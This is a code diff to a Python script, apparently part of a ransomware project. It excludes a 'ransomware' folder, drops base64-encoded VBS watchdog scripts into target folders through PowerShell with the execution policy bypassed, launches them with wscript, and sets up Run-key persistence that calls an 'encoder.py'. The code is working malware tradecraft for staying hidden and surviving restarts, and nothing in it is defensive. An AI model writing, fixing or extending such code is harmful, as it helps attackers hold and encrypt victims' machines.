@@ -57,6 +57,7 @@ folders_exclus = [
     "microsoft",
     "programdata",
     ".vscode"
+    "ransomware"
 ]
 
 vbsFile = []
@@ -93,13 +94,16 @@ def create_watchdog_vbs(script_python_path, target_dirs):
             vbs_path = os.path.join(folder, random_name)
             vbsFile.append(vbs_path)
 
+            escaped_vbs_path = vbs_path.replace("\\", "\\\\")
+
             #mettre vbs en memoire avec base64 
-            powershell_command = f'''
-            powershell -ExecutionPolicy Bypass -NoProfile -Command "$b64 = '{b64_vbs}'; 
-            $vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); 
-            [System.IO.File]::WriteAllText('{vbs_path}', $vbs); 
-            Start-Process 'wscript.exe' '{vbs_path}'"
-            '''
+            powershell_command = (
+                f'powershell -ExecutionPolicy Bypass -NoProfile -Command '
+                f'"$b64 = \'{b64_vbs}\'; '
+                f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
+                f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
+                f'Start-Process wscript.exe \'{escaped_vbs_path}\'"'
+            )
             subprocess.Popen(powershell_command, shell=True)
             #with open(vbs_path, "w", encoding="utf-8") as f:
             #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
@@ -120,7 +124,7 @@ def ajouter_run_key_vbs_relatif():
 
     # Chemin relatif vers le script à exécuter (ici .py, mais tu peux mettre .exe ou .bat)
     current_dir = os.path.dirname(os.path.realpath(__file__))
-    chemin_script_python = os.path.join(hidden_dir, "encoder.py")
+    chemin_script_python = os.path.join(current_dir, "encoder.py")
 
     # Contenu du VBS (avec chemin relatif)
     vbs_template = f'''
